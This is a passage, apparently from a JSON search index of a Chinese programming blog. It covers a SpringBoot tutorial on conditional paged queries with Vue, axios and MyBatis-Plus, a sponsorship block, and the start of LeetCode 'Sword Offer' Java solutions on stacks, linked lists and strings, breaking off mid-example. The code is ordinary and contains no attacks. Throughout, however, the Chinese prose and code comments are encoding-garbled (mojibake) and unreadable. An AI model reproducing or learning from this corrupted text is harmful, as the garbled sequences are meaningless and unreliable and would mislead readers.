â‘¦æ¡ä»¶æŸ¥è¯¢\n\næ¡ä»¶æŸ¥è¯¢å¯ä»¥ç†è§£ä¸ºåˆ†é¡µæŸ¥è¯¢çš„æ—¶å€™é™¤äº†æºå¸¦åˆ†é¡µæ•°æ®å†å¤šå¸¦å‡ ä¸ªæ•°æ®çš„æŸ¥è¯¢ã€‚è¿™äº›å¤šå¸¦çš„æ•°æ®å°±æ˜¯æŸ¥è¯¢æ¡ä»¶ã€‚\n\né¡µé¢å‘é€è¯·æ±‚æ—¶ï¼Œä¸¤ä¸ªåˆ†é¡µæ•°æ®ä»ç„¶ä½¿ç”¨è·¯å¾„å˜é‡ï¼Œå…¶ä»–æ¡ä»¶é‡‡ç”¨åŠ¨æ€æ‹¼è£…urlå‚æ•°çš„å½¢å¼ä¼ é€’\n\n**a.é¡µé¢å°è£…æŸ¥è¯¢æ¡ä»¶å­—æ®µ**\n\n```js\npagination: {\t\t\n//åˆ†é¡µç›¸å…³æ¨¡å‹æ•°æ®\n\tcurrentPage: 1,\t\t//å½“å‰é¡µç \n\tpageSize:10,\t\t//æ¯é¡µæ˜¾ç¤ºçš„è®°å½•æ•°\n\ttotal:0,\t\t\t//æ€»è®°å½•æ•°\n\tname: \"\",\n\ttype: \"\",\n\tdescription: \"\"\n},\n```\n\n**b.é¡µé¢æ·»åŠ æŸ¥è¯¢æ¡ä»¶å­—æ®µå¯¹åº”çš„æ•°æ®æ¨¡å‹ç»‘å®šåç§°**\n\n```html\n<div class=\"filter-container\">\n    <el-input placeholder=\"å›¾ä¹¦ç±»åˆ«\" v-model=\"pagination.type\" class=\"filter-item\"/>\n    <el-input placeholder=\"å›¾ä¹¦åç§°\" v-model=\"pagination.name\" class=\"filter-item\"/>\n    <el-input placeholder=\"å›¾ä¹¦æè¿°\" v-model=\"pagination.description\" class=\"filter-item\"/>\n    <el-button @click=\"getAll()\" class=\"dalfBut\">æŸ¥è¯¢</el-button>\n    <el-button type=\"primary\" class=\"butT\" @click=\"handleCreate()\">æ–°å»º</el-button>\n</div>\n```\n\n**c.å°†æŸ¥è¯¢æ¡ä»¶ç»„ç»‡æˆurlå‚æ•°ï¼Œæ·»åŠ åˆ°è¯·æ±‚urlåœ°å€ä¸­**\n\n```js\ngetAll() {\n  //1.è·å–æŸ¥è¯¢æ¡ä»¶,æ‹¼æ¥æŸ¥è¯¢æ¡ä»¶\n  param = \"?name=\"+this.pagination.name;\n  param += \"&type=\"+this.pagination.type;\n  param += \"&description=\"+this.pagination.description;\n  //console.log(param);\n  axios.get(\"/books/\"+this.pagination.currentPage+\"/\"+this.pagination.pageSize+param)\n    .then((res)=>{\n    //console.log(res.data.data);\n    this.pagination.currentPage = res.data.data.current;\n    this.pagination.pageSize = res.data.data.size;\n    this.pagination.total = res.data.data.total;\n    this.dataList = res.data.data.records;\n  })\n},\n```\n\n**d.åå°ä»£ç ä¸­å®šä¹‰å®ä½“ç±»å°æŸ¥è¯¢æ¡ä»¶**\n\n```java\n@GetMapping(\"{currentPage}/{pageSize}\")\npublic IPage<Book> getPage(@PathVariable int currentPage, @PathVariable int pageSize,Book book){\n    System.out.println(\"å‚æ•°=====>\"+book);\n    IPage<Book> page = bookService.getPage(currentPage, pageSize, book);\n    //å¦‚æœå½“å‰é¡µç å€¼å¤§äºäº†æ€»é¡µç å€¼ï¼Œé‚£ä¹ˆé‡æ–°æ‰§è¡ŒæŸ¥è¯¢æ“ä½œï¼Œä½¿ç”¨æœ€å¤§é¡µç å€¼ä½œä¸ºå½“å‰é¡µç å€¼\n    if( currentPage > page.getPages()){\n      \tpage = bookService.getPage((int)page.getPages(), pageSize, book);\n    }\n    return page;\n}\n```\n\n**e.å¯¹åº”ä¸šåŠ¡å±‚æ¥å£ä¸å®ç°ç±»è¿›è¡Œä¿®æ­£**\n\n```java\npublic interface BookService {\n    IPage<Book> getPage(int currentPage,int pageSize,Book book);\n}\n```\n\n```java\n@Service\npublic class BookServiceImpl  implements BookService {\n  @Override\n  public IPage<Book> getPage(int currentPage, int pageSize, Book book) {\n      IPage page = new Page(currentPage,pageSize);\n      LambdaQueryWrapper<Book> lqw = new LambdaQueryWrapper<Book>();\n      lqw.like(Strings.isNotEmpty(book.getName()),Book::getName,book.getName());\n      lqw.like(Strings.isNotEmpty(book.getType()),Book::getType,book.getType());\nlqw.like(Strings.isNotEmpty(book.getDescription()),Book::getDescription,book.getDescription());\n      return bookDao.selectPage(page,lqw);\n    }\n}\n```\n\n**æ€»ç»“**\n\n1. å®šä¹‰æŸ¥è¯¢æ¡ä»¶æ•°æ®æ¨¡å‹ï¼ˆå½“å‰å°è£…åˆ°åˆ†é¡µæ•°æ®æ¨¡å‹ä¸­ï¼‰\n2. å¼‚æ­¥è°ƒç”¨åˆ†é¡µåŠŸèƒ½å¹¶é€šè¿‡è¯·æ±‚å‚æ•°ä¼ é€’æ•°æ®åˆ°åå°\n\n# Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["SpringBoot"],"categories":["Spring"]},{"title":"LeetCode-å‰‘æŒ‡offer","url":"/posts/26733.html","content":"\né¦–åˆ·å‰‘æŒ‡offerï¼Œåˆ·èµ·æ¥è¿˜æ˜¯æ¯”è¾ƒåƒåŠ›ï¼Œå¤§å¤šæ•°é¢˜éœ€è¦çœ‹é¢˜è§£æ‰èƒ½åšå‡ºæ¥ï¼Œç”šè‡³æœ‰çš„çœ‹äº†é¢˜è§£éƒ½ä¸æ‡‚ğŸ˜­ï¼Œæˆ‘æ˜¯åºŸç‰©ï¼Œå¸Œæœ›ç¬¬äºŒæ¬¡åˆ·çš„æ—¶å€™å¤§éƒ¨åˆ†é¢˜éƒ½èƒ½è‡ªå·±åšå‡ºæ¥å§ï¼ï¼ï¼\n\n\n\n# å‰‘æŒ‡Offer\n\n| ç®€å• | ä¸­ç­‰ | å›°éš¾ |\n| :--: | :--: | :--: |\n| 38é“ | 31é“ | 6é“  |\n\n# ç¬¬ 1 å¤© æ ˆä¸é˜Ÿåˆ—\n\n## 09. ç”¨ä¸¤ä¸ªæ ˆå®ç°é˜Ÿåˆ—\n\n### é¢˜ç›®\n\n> ç”¨ä¸¤ä¸ªæ ˆå®ç°ä¸€ä¸ªé˜Ÿåˆ—ã€‚é˜Ÿåˆ—çš„å£°æ˜å¦‚ä¸‹ï¼Œè¯·å®ç°å®ƒçš„ä¸¤ä¸ªå‡½æ•° appendTail å’Œ deleteHead ï¼Œåˆ†åˆ«å®Œæˆåœ¨é˜Ÿåˆ—å°¾éƒ¨æ’å…¥æ•´æ•°å’Œåœ¨é˜Ÿåˆ—å¤´éƒ¨åˆ é™¤æ•´æ•°çš„åŠŸèƒ½ã€‚(è‹¥é˜Ÿåˆ—ä¸­æ²¡æœ‰å…ƒç´ ï¼ŒdeleteHead æ“ä½œè¿”å› -1 )\n> ```bash\n> ç¤ºä¾‹ 1ï¼š\n> è¾“å…¥ï¼š\n> [\"CQueue\",\"appendTail\",\"deleteHead\",\"deleteHead\"]\n> [[],[3],[],[]]\n> è¾“å‡ºï¼š[null,null,3,-1]\n> \n> ç¤ºä¾‹ 2ï¼š\n> è¾“å…¥ï¼š\n> [\"CQueue\",\"deleteHead\",\"appendTail\",\"appendTail\",\"deleteHead\",\"deleteHead\"]\n> [[],[],[5],[2],[],[]]\n> è¾“å‡ºï¼š[null,-1,null,null,5,2]```\n\n### è§£ç­”\n\n- æˆå‘˜å˜é‡ï¼šç»´æŠ¤ä¸¤ä¸ªæ ˆ inStack å’Œ outStackï¼Œå…¶ä¸­ inStack æ”¯æŒé˜Ÿé¦–æ’å…¥(appendTail)æ“ä½œï¼ŒoutStack æ”¯æŒé˜Ÿå°¾åˆ é™¤(deleteHead)æ“ä½œ\n- æ„é€ æ–¹æ³•ï¼ˆCQueueï¼‰ï¼šåˆå§‹åŒ– inStack å’Œ outStack ä¸ºç©º\n- é˜Ÿé¦–æ’å…¥å…ƒç´ ï¼ˆappendTailï¼‰ï¼šinStack ç›´æ¥æ’å…¥å…ƒç´ \n- é˜Ÿå°¾åˆ é™¤å…ƒç´ ï¼ˆdeleteHeadï¼‰ï¼š\n  - **å½“ outStack ä¸ä¸ºç©º**ï¼š outStack ä¸­ä»æœ‰å·²å®Œæˆå€’åºçš„å…ƒç´ ï¼Œå› æ­¤ç›´æ¥è¿”å› outStack çš„æ ˆé¡¶å…ƒç´ ã€‚\n  - **å½“ outStack ä¸ºç©ºï¼ŒinStackä¸ºç©ºï¼š** å³ä¸¤ä¸ªæ ˆéƒ½ä¸ºç©ºï¼Œæ— å…ƒç´ ï¼Œå› æ­¤è¿”å› -1 ã€‚\n  - **å½“ outStack ä¸ºç©ºï¼Œ inStackä¸ä¸ºç©ºï¼Œ**ï¼šå°† inStack é‡Œçš„æ‰€æœ‰å…ƒç´ å¼¹å‡ºæ’å…¥åˆ° outStack é‡Œï¼Œå®ç°å…ƒç´ å€’åºï¼Œå¹¶è¿”å›æ ˆ outStack çš„æ ˆé¡¶å…ƒç´ ã€‚\n\n```java\nclass CQueue {\n    //ä¸¤ä¸ªæ ˆï¼Œä¸€ä¸ªå‡ºæ ˆï¼Œä¸€ä¸ªå…¥æ ˆ\n    Stack<Integer> inStack;\n    Stack<Integer> outStack;\n    \n    public CQueue() {\n        // åˆå§‹åŒ–æ ˆ\n        inStack = new Stack<>();\n        outStack = new Stack<>();\n    }\n    \n    public void appendTail(int value) {\n        inStack.push(value);\n    }\n    \n    public int deleteHead() {\n        if(!outStack.isEmpty()){\n            return outStack.pop();\n        }\n        else{\n            if (inStack.isEmpty()){\n                return -1;\n            }\n            //å°†inStackçš„æ‰€æœ‰å€¼æ”¾å…¥outStack\n            while(!inStack.isEmpty()){\n                outStack.push(inStack.pop());\n            }\n            return outStack.pop();\n        }\n    }\n}\n```\n\n## 30. åŒ…å«minå‡½æ•°çš„æ ˆ\n\n### **é¢˜ç›®**\n\n> å®šä¹‰æ ˆçš„æ•°æ®ç»“æ„ï¼Œè¯·åœ¨è¯¥ç±»å‹ä¸­å®ç°ä¸€ä¸ªèƒ½å¤Ÿå¾—åˆ°æ ˆçš„æœ€å°å…ƒç´ çš„ min å‡½æ•°åœ¨è¯¥æ ˆä¸­ï¼Œè°ƒç”¨ minã€push åŠ pop çš„æ—¶é—´å¤æ‚åº¦éƒ½æ˜¯ O(1)ã€‚\n>```bash\nç¤ºä¾‹:\nMinStack minStack = new MinStack();\nminStack.push(-2);\nminStack.push(0);\nminStack.push(-3);\nminStack.min();   --> è¿”å› -3.\nminStack.pop();\nminStack.top();   --> è¿”å› 0.\nminStack.min();   --> è¿”å› -2.\n\n### **è§£ç­”**\n\næœ¬é¢˜éš¾ç‚¹ï¼šå°† min() å‡½æ•°å¤æ‚åº¦é™ä¸º O(1) ï¼Œå¯é€šè¿‡å»ºç«‹è¾…åŠ©æ ˆå®ç°ï¼›è®¾å®šä¸€ä¸ªè¾…åŠ©æ ˆï¼Œæ ˆé¡¶è¡¨ç¤ºå½“å‰æ•°æ®æ ˆä¸­çš„æœ€å°å€¼ï¼Œæ¯æ¬¡æœ‰æ–°å…ƒç´ å…¥æ ˆï¼Œå°±å°†å½“å‰æœ€å°å€¼å…¥è¾…åŠ©æ ˆã€‚å‡ºæ ˆæ—¶ï¼Œè¾…åŠ©æ ˆä¹Ÿè¦å°†æ ˆé¡¶å…ƒç´ å‡ºæ ˆï¼Œè¿™å°±è§£å†³äº†å‡ºæ ˆæ—¶çš„æœ€å°å€¼æ›´æ–°é—®é¢˜ã€‚\n\n```java\nclass MinStack {\n     Stack<Integer> dataStack; // æ•°æ®æ ˆ\n     Stack<Integer> minStack; // è¾…åŠ©æ ˆï¼Œè®°å½•æ¯æ¬¡æœ‰å…ƒç´ è¿›æ ˆåæˆ–è€…å‡ºæ ˆåï¼Œå…ƒç´ çš„æœ€å°å€¼\n    public MinStack() {\n        // åˆå§‹åŒ–è¾…åŠ©æ ˆå’Œæ•°æ®æ ˆ\n        dataStack = new Stack<>();\n        minStack = new Stack<>();\n    }\n    public void push(int x) {\n        dataStack.push(x);// æ•°æ®æ ˆï¼Œè¿›æ ˆ\n        // å¦‚æœè¾…åŠ©æ ˆä¸ºç©ºï¼Œæˆ–è€…è¾…åŠ©æ ˆæ ˆé¡¶ > xï¼Œåˆ™å°† x è®¾ç½®ä¸ºæœ€å°å€¼ï¼Œå³è¿›è¾…åŠ©æ ˆ\n        if(minStack.isEmpty() || minStack.peek() > x){\n            minStack.push(x);\n        }else{// å¦‚æœè¾…åŠ©æ ˆæ ˆé¡¶ < x, åˆ™ç»§ç»­å°†ä¸Šæ¬¡çš„æœ€å°å€¼å†å…¥ä¸€æ¬¡è¾…åŠ©æ ˆ\n            minStack.push(minStack.peek());\n        }  \n    }\n\n    public void pop() {\n        minStack.pop();// è¾…åŠ©æ ˆï¼Œå‡ºæ ˆ\n        dataStack.pop();// æ•°æ®æ ˆï¼Œå‡ºæ ˆ\n    }\n\n    public int top() {\n        return dataStack.peek();\n    }\n\n    public int min() {\n        return minStack.peek();\n    }\n}\n```\n\n# ç¬¬ 2 å¤© é“¾è¡¨\n\n## 06. ä»å°¾åˆ°å¤´æ‰“å°é“¾è¡¨\n\n### **é¢˜ç›®**\n\n> è¾“å…¥ä¸€ä¸ªé“¾è¡¨çš„å¤´èŠ‚ç‚¹ï¼Œä»å°¾åˆ°å¤´åè¿‡æ¥è¿”å›æ¯ä¸ªèŠ‚ç‚¹çš„å€¼ï¼ˆç”¨æ•°ç»„è¿”å›ï¼‰ã€‚\n>```\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šhead = [1,3,2]\nè¾“å‡ºï¼š[2,3,1]\n\n### **è§£ç­”**\n\næ ˆçš„ç‰¹ç‚¹æ˜¯åè¿›å…ˆå‡ºï¼Œè€ƒè™‘åˆ°æ ˆçš„è¿™ä¸€ç‰¹ç‚¹ï¼Œä½¿ç”¨æ ˆå°†é“¾è¡¨å…ƒç´ é¡ºåºå€’ç½®ã€‚\nåˆ›å»ºä¸€ä¸ªæ ˆï¼Œå°†é“¾è¡¨çš„èŠ‚ç‚¹éƒ½å‹å…¥è¯¥æ ˆï¼Œè·å¾—æ ˆçš„å¤§å° sizeï¼Œåˆ›å»ºä¸€ä¸ªæ•°ç»„ outï¼Œå…¶å¤§å°ä¸º sizeï¼Œä»æ ˆå†…å¼¹å‡ºä¸€ä¸ªèŠ‚ç‚¹ï¼Œå°†è¯¥èŠ‚ç‚¹çš„å€¼å­˜åˆ° out å½“ä¸­ï¼Œæœ€åè¿”å› out ã€‚\n\n```java\n/**\n * Definition for singly-linked list.\n * public class ListNode {\n *     int val;\n *     ListNode next;\n *     ListNode(int x) { val = x; }\n * }\n */\nclass Solution {\n    public int[] reversePrint(ListNode head) {\n        Stack<ListNode> stack = new Stack<ListNode>();\n        while(head != null){\n            stack.push(head);\n            head = head.next;\n        }\n        int size = stack.size();\n        int out[] = new int[size];\n        for(int i = 0; i < size; i++){\n            out[i] = stack.pop().val;\n        }\n        return out;\n    }\n}\n```\n\n## 24. åè½¬é“¾è¡¨\n\n### **é¢˜ç›®**\n\n> å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œè¾“å…¥ä¸€ä¸ªé“¾è¡¨çš„å¤´èŠ‚ç‚¹ï¼Œåè½¬è¯¥é“¾è¡¨å¹¶è¾“å‡ºåè½¬åé“¾è¡¨çš„å¤´èŠ‚ç‚¹ã€‚\n>```\nç¤ºä¾‹:\nè¾“å…¥: 1->2->3->4->5->NULL\nè¾“å‡º: 5->4->3->2->1->NULL\n\n### **è§£ç­”**\n\n#### æ–¹æ³•1ï¼šè¿­ä»£ï¼ˆåŒæŒ‡é’ˆï¼‰\n\nå®šä¹‰ä¸¤ä¸ªæŒ‡é’ˆ pre å’Œ cur ï¼Œåœ¨éå†é“¾è¡¨æ—¶ï¼Œå°†å½“å‰èŠ‚ç‚¹ï¼ˆcurï¼‰çš„ next æŒ‡é’ˆæ”¹ä¸ºæŒ‡å‘å‰ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆpreï¼‰ï¼Œå®Œæˆä¸€æ¬¡å±€éƒ¨åè½¬ã€‚æŒ‡å‘å‰ä¸€ä¸ªèŠ‚ç‚¹åï¼Œä¸åä¸€èŠ‚ç‚¹çš„è”ç³»å°±æ–­äº†ï¼Œå› æ­¤åœ¨æ›´æ”¹å¼•ç”¨ä¹‹å‰ï¼Œè¿˜éœ€è¦å­˜å‚¨åä¸€ä¸ªèŠ‚ç‚¹ï¼ˆtempï¼‰ã€‚ç„¶å pre å’Œ cur åŒæ—¶å¾€åç§»åŠ¨ä¸€ä¸ªä½ç½®ã€‚æœ€åè¿”å›æ–°çš„å¤´å¼•ç”¨ã€‚\n\n| ![](https://img.jwt1399.top/img/202207281850178.png) | ![](https://img.jwt1399.top/img/202207281850724.png) | ![](https://img.jwt1399.top/img/202207281850147.png) |\n| ---------------------------------------------------- | ---------------------------------------------------- | ---------------------------------------------------- |\n\n```java\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        ListNode pre = null, cur = head; //åˆå§‹åŒ–preå’Œcuråˆ†åˆ«æŒ‡å‘nullå’Œå¤´èŠ‚ç‚¹\n        while(cur != null) {\n          \tListNode temp = cur.next; // æš‚å­˜åç»§èŠ‚ç‚¹ cur.next\n            cur.next = pre;           // ä¿®æ”¹ next å¼•ç”¨æŒ‡å‘\n            pre = cur;                // pre æš‚å­˜ curï¼Œå³ pre ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªèŠ‚ç‚¹\n            cur = temp;               // cur è®¿é—®ä¸‹ä¸€èŠ‚ç‚¹\n        }\n        return pre;                   // è¿”å›æ–°çš„å¤´å¼•ç”¨\n    }\n}\n```\n\n#### æ–¹æ³•2ï¼šé€’å½’\n\nä½¿ç”¨é€’å½’æ³•éå†é“¾è¡¨ï¼Œå½“è¶Šè¿‡å°¾èŠ‚ç‚¹åç»ˆæ­¢é€’å½’ï¼Œåœ¨å›æº¯æ—¶ä¿®æ”¹å„èŠ‚ç‚¹çš„ `next` å¼•ç”¨æŒ‡å‘ã€‚\n\n- ç»ˆæ­¢æ¡ä»¶ï¼šå½“å‰èŠ‚ç‚¹å’Œåç»§ä¸ºç©ºï¼Œåˆ™è¿”å›å°¾èŠ‚ç‚¹  ï¼ˆå³åè½¬é“¾è¡¨çš„å¤´èŠ‚ç‚¹ï¼‰ï¼›\n\n- ä½¿ç”¨é€’å½’å‡½æ•°ï¼Œä¸€ç›´é€’å½’åˆ°é“¾è¡¨çš„æœ€åä¸€ä¸ªç»“ç‚¹ï¼Œè¯¥ç»“ç‚¹å°±æ˜¯åè½¬åçš„å¤´ç»“ç‚¹ï¼Œè®°ä½œ rehead\n\n- æ­¤åï¼Œæ¯æ¬¡å‡½æ•°åœ¨è¿”å›çš„è¿‡ç¨‹ä¸­ï¼Œè®©å½“å‰ç»“ç‚¹çš„ä¸‹ä¸€ä¸ªç»“ç‚¹çš„ next æŒ‡é’ˆæŒ‡å‘å½“å‰èŠ‚ç‚¹ã€‚\n\n- åŒæ—¶è®©å½“å‰ç»“ç‚¹çš„ next æŒ‡é’ˆæŒ‡å‘ NULL ï¼Œä»è€Œå®ç°ä»é“¾è¡¨å°¾éƒ¨å¼€å§‹çš„å±€éƒ¨åè½¬\n\n- å½“é€’å½’å‡½æ•°å…¨éƒ¨å‡ºæ ˆåï¼Œé“¾è¡¨åè½¬å®Œæˆï¼Œè¿”å›åè½¬é“¾è¡¨çš„å¤´èŠ‚ç‚¹ rehead ï¼›\n\n```java\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        if(head == null || head.next == null) {// ç»ˆæ­¢æ¡ä»¶\n            return head;\n        }\n        ListNode rehead = reverseList(head.next); // é€’å½’åç»§èŠ‚ç‚¹\n        head.next.next = head; // ä¿®æ”¹èŠ‚ç‚¹å¼•ç”¨æŒ‡å‘\n        head.next = null;\n        return rehead;// è¿”å›åè½¬é“¾è¡¨çš„å¤´èŠ‚ç‚¹\n    }\n}\n```\n\n## 35. å¤æ‚é“¾è¡¨çš„å¤åˆ¶\n\n### é¢˜ç›®\n\n>è¯·å®ç° copyRandomList å‡½æ•°ï¼Œå¤åˆ¶ä¸€ä¸ªå¤æ‚é“¾è¡¨ã€‚åœ¨å¤æ‚é“¾è¡¨ä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹é™¤äº†æœ‰ä¸€ä¸ª next æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œè¿˜æœ‰ä¸€ä¸ª random æŒ‡é’ˆæŒ‡å‘é“¾è¡¨ä¸­çš„ä»»æ„èŠ‚ç‚¹æˆ–è€… nullã€‚\n>\n>**ç¤ºä¾‹ 1ï¼š**\n>\n>```\n>è¾“å…¥ï¼šhead = [[7,null],[13,0],[11,4],[10,2],[1,0]]\n>è¾“å‡ºï¼š[[7,null],[13,0],[11,4],[10,2],[1,0]]\n>```\n>\n>**ç¤ºä¾‹ 2ï¼š**\n>\n>```\n>è¾“å…¥ï¼šhead = [[1,1],[2,1]]\n>è¾“å‡ºï¼š[[1,1],[2,1]]\n>```\n>ç¤ºä¾‹ 3ï¼š\n>\n>```\n>è¾“å…¥ï¼šhead = [[3,null],[3,0],[3,null]]\n>è¾“å‡ºï¼š[[3,null],[3,0],[3,null]]\n>```\n>\n>ç¤ºä¾‹ 4ï¼š\n>\n>```\n>è¾“å…¥ï¼šhead = []\n>è¾“å‡ºï¼š[]\n>è§£é‡Šï¼šç»™å®šçš„é“¾è¡¨ä¸ºç©ºï¼ˆç©ºæŒ‡é’ˆï¼‰ï¼Œå› æ­¤è¿”å› nullã€‚\n>```\n\n### è§£ç­”\n\n#### æ–¹æ³•1ï¼šå“ˆå¸Œè¡¨/Map\n\n**ç®—æ³•æµç¨‹ï¼š**\n\n- **1.**è‹¥å¤´ç»“ç‚¹ `head` ä¸ºç©ºï¼Œç›´æ¥è¿”å› null\n- **2.åˆå§‹åŒ–ï¼š**å®šä¹‰ä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œé”®ä¸ºé“¾è¡¨çš„åŸèŠ‚ç‚¹ï¼Œå€¼ä¸ºæ–°å¤åˆ¶çš„èŠ‚ç‚¹ã€‚èŠ‚ç‚¹ `cur` æŒ‡å‘å¤´èŠ‚ç‚¹ `head`\n- **3.å¤åˆ¶é“¾è¡¨ï¼š**éå†åŸé“¾è¡¨ï¼Œå°†å¤åˆ¶çš„èŠ‚ç‚¹å…¨éƒ¨å­˜å…¥å“ˆå¸Œè¡¨ä¸­\n- **4.æ„å»ºæ–°é“¾è¡¨çš„å¼•ç”¨æŒ‡å‘ï¼š**å†æ¬¡éå†åŸé“¾è¡¨ï¼Œæ„å»ºæ–°é“¾è¡¨ï¼Œç¡®å®š next å’Œ random æŒ‡é’ˆçš„æŒ‡å‘\n- **5.è¿”å›å€¼ï¼š** æ–°é“¾è¡¨çš„å¤´èŠ‚ç‚¹\n\n```java\nclass Solution {\n    public Node copyRandomList(Node head) {\n      \t// 1. è‹¥å¤´ç»“ç‚¹ä¸ºç©ºï¼Œç›´æ¥è¿”å› null\n        if(head == null) return null;\n      \t// 2. åˆå§‹åŒ–\n        Node cur = head;\n        Map<Node, Node> map = new HashMap<>();\n        // 3. å¤åˆ¶å„èŠ‚ç‚¹ï¼Œå¹¶å»ºç«‹ â€œåŸèŠ‚ç‚¹ -> æ–°èŠ‚ç‚¹â€ çš„ Map æ˜ å°„\n        while(cur != null) {\n            map.put(cur, new Node(cur.val));\n            cur = cur.next;\n        }\n        cur = head;\n        // 4. æ„å»ºæ–°é“¾è¡¨çš„ next å’Œ random æŒ‡å‘\n        while(cur != null) {\n            map.get(cur).next = map.get(cur.next);\n            map.get(cur).random = map.get(cur.random);\n            cur = cur.next;\n        }\n        // 5. è¿”å›æ–°é“¾è¡¨çš„å¤´èŠ‚ç‚¹\n        return map.get(head);\n    }\n}\n```\n\n#### æ–¹æ³•2ï¼šæ‹¼æ¥ + æ‹†åˆ†\n\n**ç®—æ³•æµç¨‹ï¼š**\n\n- 1.å¤åˆ¶å„èŠ‚ç‚¹ï¼Œæ„å»ºæ‹¼æ¥é“¾è¡¨:\n\nè®¾åŸé“¾è¡¨ä¸º node1â†’node2â†’â‹¯ ï¼Œæ„å»ºæ‹¼æ¥é“¾è¡¨ï¼šnode1â†’node1<sub>new</sub> â†’node2â†’node2<sub>new</sub> â†’â‹¯\n\n- 2.æ„å»ºæ–°é“¾è¡¨å„èŠ‚ç‚¹çš„ random æŒ‡å‘ï¼š\n\nå½“è®¿é—®åŸèŠ‚ç‚¹ `cur` çš„éšæœºæŒ‡å‘èŠ‚ç‚¹ `cur.random` æ—¶ï¼Œå¯¹åº”æ–°èŠ‚ç‚¹ `cur.next` çš„éšæœºæŒ‡å‘èŠ‚ç‚¹ä¸º `cur.random.next` \n\n- 3.æ‹†åˆ†åŸ / æ–°é“¾è¡¨ï¼š\n\nè®¾ç½® `pre/cur` åˆ†åˆ«æŒ‡å‘åŸ / æ–°é“¾è¡¨å¤´èŠ‚ç‚¹ï¼Œéå†æ‰§è¡Œ `pre.next = pre.next.next` å’Œ `cur.next = cur.next.next` å°†ä¸¤é“¾è¡¨æ‹†åˆ†å¼€\n\n- 4.è¿”å›æ–°é“¾è¡¨çš„å¤´èŠ‚ç‚¹ res å³å¯ã€‚\n\n```java\nclass Solution {\n    public Node copyRandomList(Node head) {\n        if(head == null) return null;\n        Node cur = head;\n        // 1. å¤åˆ¶å„èŠ‚ç‚¹ï¼Œå¹¶æ„å»ºæ‹¼æ¥é“¾è¡¨\n        while(cur != null) {\n            Node tmp = new Node(cur.val);\n            tmp.next = cur.next;\n            cur.next = tmp;\n            cur = tmp.next;\n        }\n        // 2. æ„å»ºå„æ–°èŠ‚ç‚¹çš„ random æŒ‡å‘\n        cur = head;\n        while(cur != null) {\n            if(cur.random != null)\n                cur.next.random = cur.random.next;\n            cur = cur.next.next;\n        }\n        // 3. æ‹†åˆ†ä¸¤é“¾è¡¨\n        cur = head.next;\n        Node pre = head, res = head.next;\n        while(cur.next != null) {\n            pre.next = pre.next.next;\n            cur.next = cur.next.next;\n            pre = pre.next;\n            cur = cur.next;\n        }\n        pre.next = null; // å•ç‹¬å¤„ç†åŸé“¾è¡¨å°¾èŠ‚ç‚¹\n        return res;      // è¿”å›æ–°é“¾è¡¨å¤´èŠ‚ç‚¹\n    }\n}\n```\n\n# ç¬¬ 3 å¤© å­—ç¬¦ä¸²\n\n## 05. æ›¿æ¢ç©ºæ ¼\n\n### **é¢˜ç›®**\n\n> è¯·å®ç°ä¸€ä¸ªå‡½æ•°ï¼ŒæŠŠå­—ç¬¦ä¸² `s` ä¸­çš„æ¯ä¸ªç©ºæ ¼æ›¿æ¢æˆ\"%20\"ã€‚\n>\n> ```\n> ç¤ºä¾‹ 1ï¼š\n> è¾“å…¥ï¼šs = \"We are happy.\"\n> è¾“å‡ºï¼š\"We%20are%20happy.\"\n> ```\n\n###  **è§£ç­”**\n\n#### æ–¹æ³•1ï¼šéå†\n\n```java\nclass Solution {\n    public String replaceSpace(String s) {\n        StringBuilder res = new StringBuilder();\n        for(int i = 0 ; i < s.length(); i++){\n            if(s.charAt(i) == ' '){\n                res.append(\"%20\");\n            }else{\n                res.append(s.charAt(i));\n            }\n        }\n        return res.toString();\n    }\n}\n```\n#### æ–¹æ³•2ï¼šæ›¿æ¢\n\n```java\nclass Solution {\n    public String replaceSpace(String s) {\n        return s.replace(\" \", \"%20\");\n    }\n}\n```\n\n## 58 - II. å·¦æ—‹è½¬å­—ç¬¦ä¸²\n\n### é¢˜ç›®\n\n> å­—ç¬¦ä¸²çš„å·¦æ—‹è½¬æ“ä½œæ˜¯æŠŠå­—ç¬¦ä¸²å‰é¢çš„è‹¥å¹²ä¸ªå­—ç¬¦è½¬ç§»åˆ°å­—ç¬¦ä¸²çš„å°¾éƒ¨ã€‚è¯·å®šä¹‰ä¸€ä¸ªå‡½æ•°å®ç°å­—ç¬¦ä¸²å·¦æ—‹è½¬æ“ä½œçš„åŠŸèƒ½ã€‚æ¯”å¦‚ï¼Œè¾“å…¥å­—ç¬¦ä¸²\"abcdefg\"å’Œæ•°å­—2ï¼Œè¯¥å‡½æ•°å°†è¿”å›å·¦æ—‹è½¬ä¸¤ä½å¾—åˆ°çš„ç»“æœ\"cdefgab\"ã€‚\n> ```\n> ç¤ºä¾‹ 1ï¼š\n> è¾“å…¥: s = \"abcdefg\", k = 2\n> è¾“å‡º: \"cdefgab\"\n> \n> ç¤ºä¾‹ 2ï¼š\n> è¾“å…¥: s = \"lrloseumgh\", k = 6\n> è¾“å‡º: 